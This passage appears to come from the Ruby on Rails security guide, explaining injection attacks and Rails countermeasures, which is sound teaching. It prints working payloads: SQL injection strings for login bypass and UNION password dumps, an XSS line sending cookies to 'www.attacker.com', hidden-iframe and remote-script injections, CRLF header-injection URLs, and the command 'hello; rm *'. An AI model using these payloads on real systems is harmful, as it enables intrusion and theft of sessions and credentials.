### Permitted lists versus Restricted lists

NOTE: _When sanitizing, protecting, or verifying something, prefer permitted lists over restricted lists._

A restricted list can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a permitted list which lists the good e-mail addresses, public actions, good HTML tags, and so on. Although sometimes it is not possible to create a permitted list (in a SPAM filter, for example), _prefer to use permitted list approaches_:

* Use before_action except: [...] instead of only: [...] for security-related actions. This way you don't forget to enable security checks for newly added actions.
* Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
* Don't try to correct user input using restricted lists:
    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
    * But reject malformed input

Permitted lists are also a good approach against the human factor of forgetting something in the restricted list.

### SQL Injection

INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._

#### Introduction

SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:

```ruby
Project.where("name = '#{params[:name]}'")
```

This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

#### Bypassing Authorization

Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

This will simply find the first record in the database, and grants access to this user.

#### Unauthorized Reading

The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

```ruby
Project.where("name = '#{params[:name]}'")
```

And now let's inject another query using the UNION statement:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

This will result in the following SQL query:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).

#### Countermeasures

Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character, and line breaks. *Using `Model.find(id)` or `Model.find_by_some thing(something)` automatically applies this countermeasure*. But in SQL fragments, especially *in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually*.

Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:

```ruby
Model.where(login: entered_user_name, password: entered_password).first
```

The array or hash form is only available in model instances. You can try `sanitize_sql()` elsewhere. _Make it a habit to think about the security consequences when using an external string in SQL_.

### Cross-Site Scripting (XSS)

INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._

#### Entry Points

An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.

#### HTML/JavaScript Injection

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.

Here is the most straightforward test to check for XSS:

```html
<script>alert('Hello');</script>
```

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

```html
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### Cookie Theft

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

```
<script>document.write(document.cookie);</script>
```

For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

The log files on www.attacker.com will read like this:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

You can mitigate these attacks (in the obvious way) by adding the **httpOnly** flag to cookies, so that document.cookie may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly), though.

##### Defacement

With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Countermeasures

_It is very important to filter malicious input, but it is also important to escape the output of the web application_.

Especially for XSS, it is important to do _permitted input filtering instead of restricted_. Permitted list filtering states the values allowed as opposed to the values not allowed. Restricted lists are never complete.

Imagine a restricted list deletes "script" from the user input. Now the attacker injects "&lt;scrscriptipt&gt;", and after the filter, "&lt;script&gt;" remains. Earlier versions of Rails used a restricted list approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

This returned "some&lt;script&gt;alert('hello')&lt;/script&gt;", which makes an attack work. That's why a permitted list approach is better, using the updated Rails 2 method sanitize():

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, _it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, and &gt; by their uninterpreted representations in HTML (`&amp;`, `&quot;`, `&lt;`, and `&gt;`).

##### Obfuscation and Encoding Injection

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

```
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus "get to know your enemy", is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.

#### Examples from the Underground

_In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:

```
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

The worms exploit a hole in Yahoo's HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why restricted list filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named "login_home_index_html", so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

### CSS Injection

INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari, and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by the well-known [MySpace Samy worm](https://samy.pl/myspace/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.

MySpace blocked many tags, but allowed CSS. So the worm's author put JavaScript into CSS like this:

```html
<div style="background:url('javascript:alert(1)')">
```

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

The eval() function is a nightmare for restricted list input filters, as it allows the style attribute to hide the word "innerHTML":

```
alert(eval('document.body.inne' + 'rHTML'));
```

The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
```

Another problem for the worm's author was the [CSRF security tokens](#cross-site-request-forgery-csrf). Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

#### Countermeasures

This example, again, showed that a restricted list filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good permitted CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a permitted CSS filter, if you really need one.

### Textile Injection

If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.

For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Use the :filter_html option to remove HTML which was not created by the Textile processor.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### Countermeasures

It is recommended to _use RedCloth in combination with a permitted input filter_, as described in the countermeasures against XSS section.

### Ajax Injection

NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the [in_place_editor plugin](https://rubygems.org/gems/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

### Command Line Injection

NOTE: _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.

```ruby
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```


### Header Injection

WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS, or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie, and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.

Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:

```ruby
redirect_to params[:referer]
```

What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

```
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._

#### Response Splitting

If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

```
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._

Unsafe Query Generation
-----------------------

Due to the way Active Record interprets parameters in combination with the way
that Rack parses query parameters it was possible to issue unexpected database
queries with `IS NULL` where clauses. As a response to that security issue
([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ),
[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)
and [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ))
`deep_munge` method was introduced as a solution to keep Rails secure by default.

Example of vulnerable code that could be used by attacker, if `deep_munge`
wasn't performed is:

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

When `params[:token]` is one of: `[nil]`, `[nil, nil, ...]` or
`['foo', nil]` it will bypass the test for `nil`, but `IS NULL` or
`IN ('foo', NULL)` where clauses still will be added to the SQL query.

To keep Rails secure by default, `deep_munge` replaces some of the values with
`nil`. Below table shows what the parameters look like based on `JSON` sent in
request:

| JSON                              | Parameters               |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

It is possible to return to old behavior and disable `deep_munge` configuring
your application if you are aware of the risk and know how to handle it:

```ruby
config.action_dispatch.perform_deep_munge = false
```

Default Headers
---------------

Every HTTP response from your Rails application receives the following default security headers.

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff',
  'X-Download-Options' => 'noopen',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

You can configure default headers in `config/application.rb`.

```ruby
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}
```

Or you can remove them.

```ruby
config.action_dispatch.default_headers.clear
```

Here is a list of common headers:

* **X-Frame-Options:** _'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
* **X-XSS-Protection:** _'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
* **X-Content-Type-Options:** _'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
* **X-Content-Security-Policy:** [A powerful mechanism for controlling which sites certain content types can be loaded from](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)
* **Access-Control-Allow-Origin:** Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
* **Strict-Transport-Security:** [Used to control if the browser is allowed to only access a site over a secure connection](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)

### Content Security Policy

Rails provides a DSL that allows you to configure a
[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
for your application. You can configure a global default policy and then
override it on a per-resource basis and even use lambdas to inject per-request
values into the header such as account subdomains in a multi-tenant application.

Example global policy:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https

  # Specify URI for violation reports
  policy.report_uri "/csp-violation-report-endpoint"
end
```

Example controller overrides:

```ruby
# Override policy inline
class PostsController < ApplicationController
  content_security_policy do |p|
    p.upgrade_insecure_requests true
  end
end

# Using literal values
class PostsController < ApplicationController
  content_security_policy do |p|
    p.base_uri "https://www.example.com"
  end
end

# Using mixed static and dynamic values
class PostsController < ApplicationController
  content_security_policy do |p|
    p.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end

# Disabling the global CSP
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

Use the `content_security_policy_report_only`
configuration attribute to set
[Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only)
in order to report only content violations for migrating
legacy content

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy_report_only = true
```

```ruby
# Controller override
class PostsController < ApplicationController
  content_security_policy_report_only only: :index
end
```

You can enable automatic nonce generation:

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end

Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
```

Then you can add an automatic nonce value by passing `nonce: true`
as part of `html_options`. Example:

```html+erb
<%= javascript_tag nonce: true do -%>
  alert('Hello, World!');
<% end -%>
```

The same works with `javascript_include_tag`:

```html+erb
<%= javascript_include_tag "script", nonce: true %>
```

Use [`csp_meta_tag`](https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag)
helper to create a meta tag "csp-nonce" with the per-session nonce value
for allowing inline `<script>` tags.

```html+erb
<head>
  <%= csp_meta_tag %>
</head>
```

This is used by the Rails UJS helper to create dynamically
loaded inline `<script>` elements.

Environmental Security
----------------------

It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, master key for `credentials.yml`, and other unencrypted secrets. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.

### Custom credentials

Rails stores secrets in `config/credentials.yml.enc`, which is encrypted and hence cannot be edited directly. Rails uses `config/master.key` or alternatively looks for environment variable `ENV["RAILS_MASTER_KEY"]` to encrypt the credentials file. The credentials file can be stored in version control, as long as master key is kept safe.

To add new secret to credentials, first run `rails secret` to get a new secret. Then run `rails credentials:edit` to edit credentials, and add the secret. Running `credentials:edit` creates new credentials file and master key, if they did not already exist.

By default, this file contains the application's
`secret_key_base`, but it could also be used to store other credentials such as access keys for external APIs.

The secrets kept in credentials file are accessible via `Rails.application.credentials`.
For example, with the following decrypted `config/credentials.yml.enc`:

    secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
    some_api_key: SOMEKEY

`Rails.application.credentials.some_api_key` returns `SOMEKEY` in any environment.

If you want an exception to be raised when some key is blank, use the bang
version:

```ruby
Rails.application.credentials.some_api_key! # => raises KeyError: :some_api_key is blank
```


TIP: Learn more about credentials with `rails credentials:help`.

WARNING: Keep your master key safe. Do not commit your master key.

Dependency Management and CVEs
------------------------------

We don’t bump dependencies just to encourage use of new versions, including for security issues. This is because application owners need to manually update their gems regardless of our efforts. Use `bundle update --conservative gem_name` to safely update vulnerable dependencies.

Additional Resources
--------------------

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

* Subscribe to the Rails security [mailing list](https://groups.google.com/forum/#!forum/rubyonrails-security).
* [Brakeman - Rails Security Scanner](https://brakemanscanner.org/) - To perform static security analysis for Rails applications.
* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too).
* A [good security blog](https://www.owasp.org) including the [Cross-Site scripting Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
